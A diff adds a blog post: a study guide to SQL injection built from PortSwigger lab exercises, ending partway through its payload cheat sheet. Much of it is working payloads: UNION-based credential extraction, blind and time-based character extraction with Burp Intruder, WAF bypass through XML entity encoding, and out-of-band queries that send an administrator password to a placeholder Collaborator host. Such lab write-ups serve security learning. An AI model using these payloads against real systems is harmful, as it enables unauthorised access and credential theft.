@@ -1,0 +1,702 @@
+---
+layout: post
+title: A Guide to SQL Injection Vulnerabilities
+date: 2026-07-11 00:00:00 +0000
+categories: [Notes, Web Security, SQL Injection]
+tags:
+  - SQLInjection
+  - SQLi
+  - WebSecurity
+  - OWASP
+  - PortSwigger
+  - UnionBased
+  - BlindSQLi
+  - ErrorBased
+  - BurpSuite
+  - Pentesting
+description: A comprehensive, structured guide to understanding, exploiting, and preventing SQL injection vulnerabilities — covering Union-based, Blind, Error-based, Time-based, and Out-of-Band techniques, database-specific differences, WAF bypass, tools, payloads, and step-by-step methodology.
+image: /assets/labs/sqli/photo.png
+paginate: true
+published: true
+---
+
+# SQL Injection — Complete Technique Reference
+
+**PortSwigger Web Security Academy · Labs 1–18 Synthesized**
+
+> [!IMPORTANT] SQL injection (SQLi) occurs when user-controlled input is concatenated into a SQL query without proper sanitisation or parameterisation. The attacker can alter the query's logic, extract hidden data, bypass authentication, enumerate the database schema, or exfiltrate data via out-of-band channels. This guide is organised by **technique** — not by lab number — with working payloads drawn from 18 PortSwigger labs and supplemented with general knowledge where noted.
+
+---
+
+## Fundamentals
+
+> [!tip] TL;DR: SQLi happens when unsanitised user input becomes part of a SQL query. The classic injection points are WHERE clauses (filter bypass), login forms (auth bypass), cookies (blind/time-based), and XML/JSON bodies (WAF-bypass via encoding).
+
+### How Queries Get Built Unsafely
+
+> [!INFO]- String Concatenation vs Parameterised Queries A vulnerable application builds SQL queries by directly concatenating user input into the SQL statement string. A safe application uses **parameterised queries** (prepared statements) where the SQL structure is fixed and user input is passed as data — the database engine never confuses it for SQL syntax.
+> 
+> ```
+> Vulnerable:   "SELECT * FROM products WHERE category = '" + user_input + "'"
+> Safe:         "SELECT * FROM products WHERE category = ?"   (parameterised)
+> ```
+> 
+> The victim query pattern across all 18 labs is a variation of:
+> 
+> ```sql
+> SELECT [columns] FROM [table] WHERE [condition] = 'USER_INPUT'
+> ```
+> 
+> Injecting a single quote (`'`) breaks out of the string literal, turning the rest of `USER_INPUT` into SQL syntax. The attacker then appends arbitrary SQL clauses (`OR`, `UNION`, `;`, etc.) after the quote.
+
+> [!QUESTION]- What should you remember?
+> 
+> - The single quote (`'`) is the universal breaker — if it errors, you likely have SQLi
+> - `'` → error confirms injection; `''` → error disappears confirms string context
+> - Comment out trailing query with `--`, `#`, or `/*` depending on DB engine
+> - The `UNION` keyword lets you append an entirely new SELECT result set
+
+### Common Injection Points
+
+> [!NOTE] Injection Points Identified Across the Labs
+> 
+> |Injection Point|Example|Lab(s)|Notes|
+> |:--|:--|:--|:--|
+> |**URL query param / path**|`/filter?category=Pets'`|1, 3–10|Most common. UNION-based injection in category filter.|
+> |**POST body (form)**|`username=administrator'--`|2|Login bypass via comment truncation.|
+> |**Cookie header**|`TrackingId=xyz'`|11–17|Blind injection (boolean, error, time, OOB). No visible output.|
+> |**XML body**|`<storeId>1 UNION SELECT ...</storeId>`|18|WAF bypass via XML entity encoding.|
+> |**JSON body**|`{"storeId":"1 UNION SELECT ..."}`|(general)|Same concept as XML — WAF bypass via encoding.|
+> |**HTTP header**|`User-Agent: Mozilla/5.0'`|(general)|Less common but valid when headers are logged to DB.|
+
+### The TIPS Mnemonic for UNION Attacks
+
+> [!NOTE] TIPS — Four Phases of UNION-Based SQLi
+> 
+> ```
+> T — Table (column count):  ' UNION SELECT NULL,NULL,...   or ORDER BY n
+> I — Identify text column:   ' UNION SELECT 'a',NULL,...
+> P — Pull schema:            ' UNION SELECT table_name,NULL FROM information_schema.tables
+> S — Steal data:            ' UNION SELECT username,password FROM users
+> ```
+> 
+> This mnemonic comes from your lab workflow across Labs 3–10. Each phase builds on the previous one.
+
+---
+
+## In-Band SQL Injection
+
+In-band means the query result (or error message) is returned directly in the HTTP response — you see the data on the page.
+
+### UNION-Based SQLi
+
+> [!tip] TL;DR: Appending `UNION SELECT <columns> FROM <table>` lets you graft extra rows onto the original query's result set. First find the column count, then identify which column accepts strings, then pull schema and data.
+
+#### Step 1: Determine Column Count
+
+> [!INFO]- Two Methods **Method A — ORDER BY** (probe until error):
+> 
+> ```sql
+> ' ORDER BY 1--    (no error)
+> ' ORDER BY 2--    (no error)
+> ' ORDER BY 3--    (error → 2 columns)
+> ```
+> 
+> **Method B — UNION SELECT NULL** (probe until no error):
+> 
+> ```sql
+> ' UNION SELECT NULL--             (error — wrong column count)
+> ' UNION SELECT NULL,NULL--        (no error → 2 columns)
+> ' UNION SELECT NULL,NULL,NULL--   (error — too many)
+> ```
+> 
+> **Why NULL?** `NULL` is type-compatible with every column, avoiding type-mismatch errors during column-count probing. You only switch to real types (strings, numbers) **after** you know the count.
+> 
+> _(Labs 7, 8, 9, 10 — these are the canonical demo of the NULL-probing technique.)_
+
+> [!SUCCESS] Example — Lab 7 (Column Count)
+> 
+> ```sql
+> ' UNION SELECT NULL--           ❌ 200 OK but 0 results (wrong count)
+> ' UNION SELECT NULL,NULL--      ❌
+> ' UNION SELECT NULL,NULL,NULL-- ✅ 200 OK + extra row → 3 columns
+> ```
+
+#### Step 2: Find a Text-Compatible Column
+
+> [!INFO]- Why This Matters You need at least one column that accepts string data to extract usernames, passwords, table names, etc. Swap each `NULL` with a literal string (`'a'`) one position at a time until the query doesn't error.
+> 
+> ```sql
+> ' UNION SELECT 'a',NULL,NULL--   ❌ type mismatch error
+> ' UNION SELECT NULL,'a',NULL--   ✅ works → column 2 is text-friendly
+> ' UNION SELECT NULL,NULL,'a'--   ❌
+> ```
+
+> [!SUCCESS] Example — Lab 8 With 3 columns confirmed, probing `' UNION SELECT NULL,'sdf',NULL--` succeeded — column 2 accepts strings. The lab then required returning a specific string (`d7uROL`) in that column to solve.
+
+#### Step 3: Enumerate the Schema (Non-Oracle)
+
+> [!INFO]- information_schema Tables For MySQL, PostgreSQL, and MSSQL, metadata lives in `information_schema`:
+> 
+> ```sql
+> -- List all tables
+> ' UNION SELECT table_name,NULL FROM information_schema.tables--
+> 
+> -- List columns for a specific table
+> ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+> ```
+> 
+> Drop `NULL` placeholders to match the column count. If only one output column is available, concatenate values:
+> 
+> ```sql
+> ' UNION SELECT NULL,table_name FROM information_schema.tables--   (2-column case)
+> ```
+
+> [!SUCCESS] Examples **Lab 5** — Enumerated `information_schema.tables`, found table `users_vwztwe`, then `information_schema.columns` found `username_ykovru` and `password_ybdatc`. Extracted: `administrator:x5y6cia4o9jc0fh2roih`
+> 
+> **Lab 9** — Same technique with table named `users` directly:
+> 
+> ```sql
+> ' UNION SELECT username,password FROM users--
+> ```
+
+#### Step 3 (Oracle): Enumerate the Schema
+
+> [!INFO]- Oracle's all_tables / all_tab_columns Oracle does not have `information_schema`. Use its data dictionary views instead:
+> 
+> ```sql
+> -- Every UNION SELECT in Oracle MUST include FROM DUAL
+> ' UNION SELECT NULL,NULL FROM DUAL--
+> 
+> -- List all tables
+> ' UNION SELECT table_name,NULL FROM all_tables--
+> 
+> -- List columns for a specific table
+> ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_HSOHVE'--
+> ```
+
+> [!SUCCESS] Example — Lab 6 (Oracle)
+> 
+> ```sql
+> ' UNION SELECT table_name,NULL FROM all_tables--
+> -- Found table: USERS_HSOHVE
+> 
+> ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_HSOHVE'--
+> -- Found: USERNAME_EXJTIW, PASSWORD_RUEYYM
+> 
+> ' UNION SELECT USERNAME_EXJTIW,PASSWORD_RUEYYM FROM USERS_HSOHVE--
+> -- Output: administrator + password
+> ```
+
+#### Step 4: Extract Data
+
+> [!INFO]- Simple Extraction Once you know the table and column names, the final query is trivial:
+> 
+> ```sql
+> ' UNION SELECT username,password FROM users--
+> ```
+> 
+> If the column count doesn't match (e.g., 1 output column but 2 values needed), use concatenation (see Step 5).
+
+#### Step 5: Retrieve Multiple Values in One Column
+
+> [!INFO]- Concatenation with Separator When only one text column is available but you need to extract two or more values, concatenate them with a separator:
+> 
+> ```sql
+> -- Oracle, PostgreSQL: ||
+> ' UNION SELECT NULL,username||'~'||password FROM users--
+> 
+> -- MSSQL: +
+> ' UNION SELECT NULL,username+'~'+password FROM users--
+> 
+> -- MySQL: CONCAT()
+> ' UNION SELECT NULL,CONCAT(username,'~',password) FROM users--
+> ```
+
+> [!SUCCESS] Example — Lab 10 After confirming 2 columns and only the second being text-friendly:
+> 
+> ```sql
+> ' UNION SELECT NULL,username||'~'||password FROM users--
+> ```
+> 
+> Output: `administrator~<password>` in a single field.
+
+> [!QUESTION]- What should you remember?
+> 
+> - Column count first (NULLs), then text column (string literal), THEN schema
+> - Oracle needs `FROM DUAL` on every UNION SELECT
+> - MySQL/MSSQL use `--` (space after dash) or `#` (MySQL only) for comments
+> - Use `||` (Oracle/PG), `+` (MSSQL), or `CONCAT()` (MySQL) for multi-value single-column extraction
+
+### Error-Based SQLi (Visible Errors)
+
+> [!tip] TL;DR: When the app displays SQL error messages verbosely, you can force a type-casting error that includes leaked data directly in the error text. No UNION needed — just one `CAST()` call.
+
+> [!INFO]- CAST() Type-Confusion Trick The technique: make the database try to convert a string (your target data) into an integer. The conversion fails, and the error message helpfully includes the string value that failed.
+> 
+> ```sql
+> ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+> ```
+> 
+> The database executes the subquery, gets the password string, tries `CAST('actual_password' AS int)`, which fails — and the error message reads:
+> 
+> ```
+> Conversion failed when converting the varchar value 'actual_password' to data type int.
+> ```
+
+> [!SUCCESS] Example — Lab 13
+> 
+> 1. Confirm verbose errors: add `'` → SQL error with query details
+> 2. Control leaked content: `' AND 1=CAST((SELECT 'test') AS int)--` → error shows `'test'`
+> 3. Leak username: `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` → error shows `administrator`
+> 4. Leak password: replace subquery with `SELECT password FROM users LIMIT 1` → error shows the password
+> 
+> This is the fastest SQLi technique — single request per leaked value, no iteration.
+
+> [!NOTE] DB-Specific CAST Error Syntax
+> 
+> |DB Engine|Payload|Error Contains|
+> |:--|:--|:--|
+> |**MSSQL**|`' AND 1=CAST((SELECT password FROM users) AS int)--`|`Conversion failed when converting...`|
+> |**PostgreSQL**|`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`|`invalid input syntax for integer: "..."`|
+> |**MySQL**|`' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users)))--`|`XPATH syntax error: '\...'`|
+> |**Oracle**|(general) Oracle typically doesn't expose data in CAST errors — use conditional errors or OOB instead.||
+
+---
+
+## Blind SQL Injection
+
+> [!tip] TL;DR: When no data or errors appear in the response, use a true/false oracle: Boolean (page content changes), conditional error (error vs no error), time delay (fast vs slow), or OOB (DNS/HTTP callback).
+
+### Boolean-Based (Conditional Responses)
+
+> [!INFO]- True/False via Page Content The app includes a visible difference (e.g., a "Welcome back" message) only when a condition in the SQL is true. By injecting an `AND <condition>` clause, you turn the presence/absence of that message into a binary oracle.
+> 
+> ```sql
+> ' AND '1'='1'--   → message appears (true)
+> ' AND '1'='2'--   → message disappears (false)
+> ```
+> 
+> This confirms you have a boolean oracle. Then test existence of objects, then extract characters.
+
+> [!SUCCESS] Example — Lab 11 (TrackingId Cookie)
+> 
+> 1. **Confirm oracle:** `' AND '1'='1'--` → "Welcome back" ✓ ; `' AND '1'='2'--` → gone ✓
+> 2. **Confirm table/user:** `' AND (SELECT 'a' FROM users WHERE username='administrator')='a` → message appears
+> 3. **Find password length:** Intruder fuzz `LENGTH(password)>N` (1–30) → true for N=1..19, false at N=20 → length = 20
+> 4. **Extract each character:** `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` → iterate position 1..20, character a..z0..9
+> 5. **Reconstruct password from matching positions** → login
+
+> [!NOTE] Burp Intruder Settings for Boolean Blind
+> 
+> - **Attack type:** Cluster bomb (position 1 = character index; position 2 = guessed char)
+> - **Payload 1:** numbers 1–20 (sequential)
+> - **Payload 2:** a–z, 0–9 (character set)
+> - **Resource pool:** Max concurrent requests = 1 (optional for boolean, but keeps ordering clean)
+> - **Grep match:** "Welcome back" (or whatever the true-condition string is)
+> - **Result:** Filter rows with ✓ — those give you char index + matching char
+
+### Conditional Error
+
+> [!INFO]- True → Error, False → Clean When page content doesn't change between true/false conditions but error output does, you can use a CASE expression that triggers a divide-by-zero only when the condition is true.
+> 
+> ```sql
+> -- Oracle
+> ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+> → True: divide-by-zero error. False: no error.
+> ```
+
+> [!SUCCESS] Example — Lab 12 (Oracle, TrackingId Cookie)
+> 
+> 1. **Confirm injection:** `'` → error page ; `''` → no error ✓
+> 2. **Test conditional error:** `' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--` → error (true). `1=2` → no error (false).
+> 3. **Confirm administrator exists:** embed the user check inside CASE
+> 4. **Extract password length:** fuzz `LENGTH(password)>N` where error = true (message appears), no error (stops) at N=20
+> 5. **Extract each character:** `' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--`
+> 6. Cluster bomb in Intruder, filter responses containing "internal server error"
+
+> [!NOTE] DB-Specific Conditional Error Payloads
+> 
+> |DB Engine|Payload|
+> |:--|:--|
+> |**Oracle**|`' AND (SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--`|
+> |**MSSQL**|`' AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END)--`|
+> |**PostgreSQL**|`' OR (SELECT CASE WHEN (condition) THEN 1/(SELECT 0) ELSE NULL END)--`|
+> |**MySQL**|`' AND IF((condition),(SELECT table_name FROM information_schema.tables),'a')--`|
+
+### Time-Based
+
+> [!tip] TL;DR: When the response looks identical regardless of true/false, force a sleep. Correct guess → 10-second delay. Wrong guess → instant response.
+
+> [!INFO]- Simple Delay (Confirm Injection) First confirm the injection point supports sleep:
+> 
+> ```sql
+> -- PostgreSQL (Lab 14, 15)
+> '||pg_sleep(10)--
+> 
+> -- MySQL
+> ' OR SLEEP(10)--
+> 
+> -- MSSQL
+> ' WAITFOR DELAY '0:0:10'--
+> 
+> -- Oracle
+> ' OR dbms_pipe.receive_message(('a'),10)--
+> ```
+> 
+> If the response takes ~10 seconds, the injection is confirmed and you know the DB engine.
+
+> [!INFO]- Conditional Delay (Extract Data) Wrap the sleep inside a CASE expression:
+> 
+> ```sql
+> -- PostgreSQL
+> '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+> ```
+> 
+> Notice the `;` (batched query) and URL-encoded spaces/semicolons (`%3b`). When the guessed character matches, the query sleeps 10 seconds; otherwise returns instantly.
+
+> [!SUCCESS] Example — Lab 15 (PostgreSQL, TrackingId Cookie)
+> 
+> 1. **Confirm delay:** `'||pg_sleep(10)--` → ~10s response ✓
+> 2. **Confirm admin user:** `'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` → delayed ✓
+> 3. **Password length:** Intruder fuzz `LENGTH(password)>N` — delayed for 1..19, instant at 20 → length = 20
+> 4. **Extract chars:** `'%3bSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+> 5. **Burp settings:** Cluster bomb, resource pool max concurrent = 1, filter by response time > 5000ms
+> 6. **Result:** `4fg8r74xh6k7ub7gjmdw`
+
+> [!WARNING] Time-Based Gotchas
+> 
+> - **Resource pool must be max 1 concurrent request** — overlapping requests corrupt timing measurements (Lab 15 step 9d).
+> - **Network jitter can produce false positives** — use 10-second sleep (not 2–3s) for reliable signal.
+> - **URL-encode semicolons and spaces** when injecting batched queries. `;` → `%3b`, space → `+`.
+> - (general reference) Some production DBs may have `SLEEP()` or `pg_sleep()` restricted — have a fallback like heavy query (`BENCHMARK()` in MySQL, or `AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)` for a CPU-based delay).
+
+### Out-of-Band (OOB)
+
+> [!tip] TL;DR: When no response signal exists at all (no content change, no error, no timing), make the DB send a DNS/HTTP request to your Burp Collaborator domain. If you get a callback, the injection works.
+
+> [!INFO]- DNS/HTTP Exfiltration The DB is forced to perform a DNS lookup to a domain you control (Burp Collaborator). The lookup itself proves injection. Embedding data in the subdomain proves exfiltration.
+> 
+> **Step 1** — Generate a unique Collaborator subdomain in Burp.
+> 
+> **Step 2** — Inject a payload that triggers an external request:
+> 
+> ```sql
+> -- Oracle (XXE via EXTRACTVALUE)
+> ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+>   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR.oastify.com"> %remote;]>'),'/l') FROM dual--
+> ```
+> 
+> **Step 3** — Poll Collaborator for DNS/HTTP interaction. If received → injection confirmed.
+> 
+> **Step 4 (Exfiltration)** — Embed the subquery result into the domain:
+> 
+> ```sql
+> ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+>   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR.oastify.com"> %remote;]>'),'/l') FROM dual--
+> ```
+
+> [!SUCCESS] Example — Lab 16 (OOB Confirm) & Lab 17 (OOB Exfil) **Lab 16** — Just confirming the injection works:
+> 
+> - Sent Oracle XXE payload with Collaborator domain → received DNS interaction → solved
+> 
+> **Lab 17** — Exfiltrating data:
+> 
+> - Embedded `(SELECT password FROM users WHERE username='administrator')` into the Collaborator hostname
+> - Polled Collaborator → DNS lookup contains `<password>.COLLABORATOR.oastify.com`
+> - Extracted password from the subdomain → login → solved
+
+> [!NOTE] OOB Payloads by DB Engine
+> 
+> |DB Engine|DNS Trigger Payload|Notes|
+> |:--|:--|:--|
+> |**Oracle (XXE)**|`SELECT EXTRACTVALUE(xmltype('<?xml ...ENTITY % remote SYSTEM "http://URL">%remote;]>'),'/l') FROM dual`|Unpatched Oracle only; requires `EXTRACTVALUE` and XML parsing|
+> |**Oracle (UTL_INADDR)**|`SELECT UTL_INADDR.get_host_address('URL')`|Works on patched Oracle; needs elevated privileges|
+> |**MSSQL**|`exec master..xp_dirtree '//URL/a'`|Requires `xp_dirtree` (often available)|
+> |**PostgreSQL**|`copy (SELECT '') to program 'nslookup URL'`|Needs `copy` privileges|
+> |**MySQL (Windows)**|`LOAD_FILE('\\\\URL\\a')` or `SELECT ... INTO OUTFILE '\\\\URL\\a'`|Windows-only; `LOAD_FILE` needs `FILE` privilege|
+> 
+> _(The Oracle XXE and UTL_INADDR techniques come from PortSwigger's cheat sheet; the PostgreSQL `copy` payload is more advanced — general reference if not covered in labs.)_
+
+---
+
+## Database-Specific Differences
+
+> [!tip] TL;DR: Oracle needs `FROM DUAL` and `all_tables`; MySQL uses `#` comments and `information_schema`; PostgreSQL and MSSQL share `--` and `information_schema` but differ on concatenation and sleep syntax.
+
+> [!NOTE] Comparison Table
+> 
+> |Feature|Oracle|MSSQL|PostgreSQL|MySQL|
+> |:--|:--|:--|:--|:--|
+> |**Comment**|`--`|`--` / `/*`|`--` / `/*`|`#` / `--` / `/*`|
+> |**String concat**|`'foo'||'bar'`|`'foo'+'bar'`|
+> |**Dummy table**|`DUAL`|(none needed)|(none needed)|(none needed)|
+> |**Substring**|`SUBSTR(col,start,len)`|`SUBSTRING(col,start,len)`|`SUBSTRING(col,start,len)`|`SUBSTRING(col,start,len)`|
+> |**Version query**|`SELECT banner FROM v$version`|`SELECT @@version`|`SELECT version()`|`SELECT @@version`|
+> |**Metadata tables**|`all_tables` / `all_tab_columns`|`information_schema.tables` / `.columns`|`information_schema.tables` / `.columns`|`information_schema.tables` / `.columns`|
+> |**Sleep**|`dbms_pipe.receive_message(('a'),10)`|`WAITFOR DELAY '0:0:10'`|`pg_sleep(10)`|`SLEEP(10)`|
+> |**Conditional error**|`CASE WHEN cond THEN TO_CHAR(1/0) END`|`CASE WHEN cond THEN 1/0 END`|`CASE WHEN cond THEN 1/(SELECT 0) END`|`IF(cond,(SELECT table_name FROM information_schema.tables),'a')`|
+> |**Batched queries**|Not supported|`;` separator|`;` separator|`;` (rare, depends on API)|
+> |**OOB (DNS)**|`EXTRACTVALUE(xmltype(...))` / `UTL_INADDR`|`xp_dirtree`|`copy ... to program 'nslookup ...'`|`LOAD_FILE('\\\\...')` (Windows)|
+
+> [!SUCCESS] Key DB-Engine Indicators from Labs
+> 
+> - **Oracle:** `FROM DUAL` required in UNION; `all_tables` instead of `information_schema` (Labs 3, 6, 12)
+> - **PostgreSQL:** `pg_sleep()` works; `||` for concat (Labs 14, 15)
+> - **MySQL/MSSQL:** `@@version` works; no `FROM` needed for literal SELECT (Lab 4)
+> - **MySQL specific:** `#` comment character (Lab 4, 5, 7, 8, 9, 10)
+
+---
+
+## Filter & WAF Bypass Techniques
+
+> [!tip] TL;DR: When a WAF blocks your SQLi payload, encode it inside XML entities (Hackvertor does this automatically). The WAF sees encoded gibberish; the XML parser decodes it before the SQL query runs.
+
+> [!INFO]- The Problem: WAF Blocks Keyword Patterns A WAF inspects the raw HTTP request body for SQLi signatures — `UNION`, `SELECT`, `FROM`, `--`, etc. If any match, the request is dropped before reaching the application. The standard `' UNION SELECT ...--` payload is instantly blocked.
+> 
+> **How to tell it's a WAF (not a SQL error):**
+> 
+> - A normal injection like `1 UNION SELECT NULL` returns a **block page** (WAF), not a SQL error or 200 OK
+> - The block page often looks different from the application's own error pages
+> - The app works fine with benign values but rejects anything with SQL keywords _(From Lab 18 — the `1 UNION SELECT NULL` payload was blocked outright rather than producing a SQL error.)_
+
+> [!INFO]- The Fix: XML Entity Encoding Since the injection point is inside an XML body (e.g., `<storeId>1</storeId>`), you can encode the entire SQL payload as XML hex/dec entities. The sequence:
+> 
+> 1. WAF inspects → sees `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` (nonsense) → passes
+> 2. XML parser decodes → `UNION`
+> 3. SQL query receives → `1 UNION SELECT ...`
+> 
+> **Manual encoding example:** `U` → `&#x55;` or `&#85;`, `N` → `&#x4e;` or `&#78;`, etc.
+> 
+> **Automated with Hackvertor** (Burp extension):
+> 
+> - Highlight the payload → right-click → Extensions → Hackvertor → Encode → `hex_entities` or `dec_entities`
+> - Hackvertor wraps it: `<@hex_entities>1 UNION SELECT ...</@hex_entities>`
+> - The extension handles encoding/decoding transparently in Repeater
+
+> [!SUCCESS] Example — Lab 18 (XML + WAF)
+> 
+> 1. `POST /product/stock` with XML body: `<storeId>1+1</storeId>` → response shows store 2 (confirms injection)
+> 2. `<storeId>1 UNION SELECT NULL</storeId>` → **blocked** by WAF
+> 3. Highlight the payload → Hackvertor → hex_entities → wrapped in `<@hex_entities>...`
+> 4. Resend → **200 OK** (WAF bypassed)
+> 5. Column count = 1 (single column returned)
+> 6. Concatenate username + password: `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`
+> 7. Response contains all credentials → login → solved
+
+> [!NOTE] Other Bypass Techniques (General Reference) These are not directly from your labs but are worth knowing:
+> 
+> - **Case variation:** `UnIoN sElEcT` — defeats case-sensitive filters
+> - **Comments in keywords:** `UN/**/ION SEL/**/ECT` — breaks keyword matching
+> - **Whitespace alternatives:** `UNION%0aSELECT` (newline), `UNION%09SELECT` (tab) — bypass space filters
+> - **Double URL encoding:** `%25%32%37` → `%27` → `'` — if the WAF decodes once but the app decodes again
+> - **HTTP parameter pollution:** `?id=1&id=UNION&id=SELECT...` — some WAFs only check the first parameter
+
+---
+
+## Practical Methodology / Workflow
+
+> [!tip] TL;DR: Seven-step repeatable process — find injection point → confirm → column count → text column → schema → data → login/use.
+
+> [!INFO]- The Seven-Step SQLi Workflow
+> 
+> ```
+> ╔══════════════════════════════════════════════════════════════════╗
+> ║  SQLi WORKFLOW (derived from Labs 1–18)                          ║
+> ╠══════════════════════════════════════════════════════════════════╣
+> ║                                                                    ║
+> ║  1. FIND INJECTION POINT                                          ║
+> ║     └─ Inject `'` → error = SQLi likely                           ║
+> ║     └─ Inject `'` → no error but behavior change = blind          ║
+> ║     └─ Inject `'` → blocked = WAF (try encoding)                  ║
+> ║                                                                    ║
+> ║  2. CONFIRM VULNERABILITY                                         ║
+> ║     └─ Boolean: `' AND '1'='1'--` vs `' AND '1'='2'--`            ║
+> ║     └─ Time: `'||pg_sleep(10)--` → ~10s delay                     ║
+> ║     └─ Error: `' AND 1=CAST((SELECT 1) AS int)--` → error msg     ║
+> ║     └─ OOB: Collaborator payload → DNS callback                   ║
+> ║                                                                    ║
+> ║  3. DETERMINE DB ENGINE                                           ║
+> ║     └─ `SELECT @@version` vs `FROM DUAL` vs `version()`           ║
+> ║                                                                    ║
+> ║  4. FIND COLUMN COUNT (T in TIPS)                                 ║
+> ║     └─ `ORDER BY n` or `UNION SELECT NULL,...`                    ║
+> ║                                                                    ║
+> ║  5. FIND TEXT COLUMN (I in TIPS)                                  ║
+> ║     └─ Replace NULLs with `'a'` one at a time                     ║
+> ║                                                                    ║
+> ║  6. ENUMERATE SCHEMA (P in TIPS)                                  ║
+> ║     └─ Non-Oracle: `information_schema.tables / .columns`         ║
+> ║     └─ Oracle: `all_tables / all_tab_columns`                     ║
+> ║                                                                    ║
+> ║  7. EXTRACT DATA (S in TIPS)                                      ║
+> ║     └─ UNION: `SELECT username,password FROM users`               ║
+> ║     └─ Blind: iterate SUBSTRING + true/false oracle               ║
+> ║     └─ Error: CAST(subquery AS int)                               ║
+> ║     └─ OOB: embed subquery in Collaborator hostname                ║
+> ║                                                                    ║
+> ╚══════════════════════════════════════════════════════════════════╝
+> ```
+
+> [!NOTE] Decision Tree: Which Technique to Use
+> 
+> ```
+> Can you see query output on the page?
+>   ├── YES ──→ UNION-based SQLi (fastest)
+>   │
+>   └── NO
+>       ├── Does the app show SQL errors?
+>       │   ├── YES ──→ Error-based (CAST() trick) — single request per value
+>       │   └── NO
+>       │       ├── Does page content change between true/false conditions?
+>       │       │   ├── YES ──→ Boolean-based blind
+>       │       │   └── NO
+>       │       │       ├── Does error presence change between true/false?
+>       │       │       │   ├── YES ──→ Conditional error blind
+>       │       │       │   └── NO
+>       │       │       │       ├── Can you inject a sleep()?
+>       │       │       │       │   ├── YES ──→ Time-based blind
+>       │       │       │       │   └── NO ──→ OOB (DNS/HTTP)
+> ```
+
+---
+
+## Tooling Notes — Burp Suite
+
+> [!tip] TL;DR: These are the specific Burp techniques used across the labs — Repeater for manual probes, Intruder for blind iteration (Cluster Bomb + resource pool), and Hackvertor for WAF bypass.
+
+> [!INFO]- Repeater Workflow (All In-Band Labs)
+> 
+> 1. Browse target page with Burp Proxy intercept OFF
+> 2. Find the request in **HTTP history** (not just intercepted — the full request is easier to modify in Repeater)
+> 3. Right-click → **Send to Repeater**
+> 4. Modify the injection point, click **Send**, observe response
+> 5. Use `Ctrl+U` / `Cmd+U` to URL-encode special characters in place
+> 
+> _(Labs 1–10 all used this pattern: history → Repeater → modify → send.)_
+
+> [!INFO]- Intruder for Blind Iteration Boolean, conditional error, and time-based blind extraction all follow the same Intruder pattern:
+> 
+> |Setting|Boolean (Lab 11)|Conditional Error (Lab 12)|Time-Based (Lab 15)|
+> |:--|:--|:--|:--|
+> |**Attack type**|Cluster bomb|Cluster bomb|Cluster bomb|
+> |**Payload 1**|Position index (1–20)|Same|Same|
+> |**Payload 2**|a–z, 0–9|a–z, 0–9|a–z, 0–9|
+> |**Resource pool**|1 concurrent|1 concurrent|**1 concurrent**|
+> |**Filter**|Grep match "Welcome back"|Grep match "Internal Server Error"|Response time > 5000ms|
+> 
+> **Resource pool is critical for time-based:** Labs 11 and 12 (boolean/error) can technically run multiple concurrent requests because each response is independent — but Lab 15 (time-based) **must** have max concurrent = 1. Overlapping requests cause the server to serialize them, making all responses take longer and destroying the timing signal.
+
+> [!INFO]- Hackvertor for WAF Bypass Lab 18 required encoding the SQL payload inside XML entities to bypass a WAF. The Hackvertor Burp extension automates this:
+> 
+> 6. Install Hackvertor from the BApp Store
+> 7. In Repeater, **highlight** the SQL payload in the XML body
+> 8. Right-click → **Extensions → Hackvertor → Encode → hex_entities**
+> 9. The payload is wrapped: `<@hex_entities>1 UNION SELECT ...</@hex_entities>`
+> 10. Hackvertor decodes it automatically when you send the request — no manual URL-encoding needed
+> 
+> If Hackvertor is unavailable, manual hex entity encoding works: each character → `&#xHEX;`. E.g., `U` → `&#x55;`, `N` → `&#x4e;`, `I` → `&#x49;`, `O` → `&#x4f;`, `N` → `&#x4e;`.
+
+> [!INFO]- Collaborator for OOB
+> 
+> 11. Burp → **Collaborator client** → **Copy to clipboard**
+> 12. Paste the Collaborator domain into your OOB payload
+> 13. Send the request
+> 14. **Poll now** in Collaborator → look for DNS/HTTP interactions
+> 15. For exfiltration: the leaked data appears as a subdomain prefix in the DNS query
+
+---
+
+## Payload Cheat Sheet
+
+> [!NOTE] Deduplicated Payloads from Labs 1–18
+> 
+> |Technique|DB|Payload|Lab|What It Does|
+> |:--|:--|:--|:--|:--|
+> |WHERE clause bypass|Any|`' OR 1=1--`|1|Makes `WHERE` true for all rows — bypasses category filter|
+> |Login bypass|Any|`administrator'--`|2|Comments out password check — logs in as any known user|
+> |Column count (ORDER BY)|Any|`' ORDER BY 3--`|7|Error at n+1 reveals column count|
+> |Column count (UNION NULL)|Any|`' UNION SELECT NULL,NULL,NULL--`|7|No error = correct column count|
